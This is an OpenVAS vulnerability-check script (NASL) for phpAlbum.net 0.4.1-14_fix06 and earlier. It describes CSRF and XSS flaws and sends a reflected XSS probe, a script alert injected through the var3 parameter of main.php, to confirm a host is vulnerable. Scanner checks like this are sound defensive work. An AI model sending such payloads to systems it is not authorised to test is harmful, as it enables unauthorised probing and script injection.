###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpalbum_multiple_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# phpAlbum.net Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801924");
  script_version("$Revision: 7019 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_name("phpAlbum.net Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://videowarning.com/?p=6499");
  script_xref(name : "URL" , value : "http://www.phpdatabase.net/project/issues/402");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011040083");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/100428/phpalbumdotnet-xssxsrfexec.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could result in a compromise of the
  application, theft of cookie-based authentication credentials, disclosure or
  modification of sensitive data.

  Impact Level: Application");
  script_tag(name : "affected" , value : "phpAlbum.net version 0.4.1-14_fix06 and prior.");
  script_tag(name : "insight" , value : "The flaws are due to
  - Failure in the 'main.php' script to properly verify the source of HTTP request.
  - Failure in the 'phpdatabase.php' script to properly sanitize user-supplied
  input in 'var3' variable.
  - Failure in the 'setup.php' script to properly sanitize user-supplied input
  in 'ar3', 'p_new_group_name' variables.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running phpAlbum.net and is prone to Multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get phpAlbum.net Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## check for each possible path
foreach dir (make_list_unique("/phpAlbum", "/phpAlbumnet", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  req = http_get(item: dir + "/main.php", port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('<title>phpAlbum.net</title>' >< res)
  {
     req = http_get(item:string(dir, '/main.php?cmd=setup&var1=user&var3=1">' +
                                '<script>alert("XSS-TEST")</script>'), port:port);
     res = http_keepalive_send_recv(port:port, data:req);
     ## Confirm exploit worked by checking the response
     if(res =~ "HTTP/1\.. 200" && '><script>alert("XSS-TEST")</script>' >< res)
     {
       security_message(port:port);
       exit(0);
     }
  }
}

exit(99);
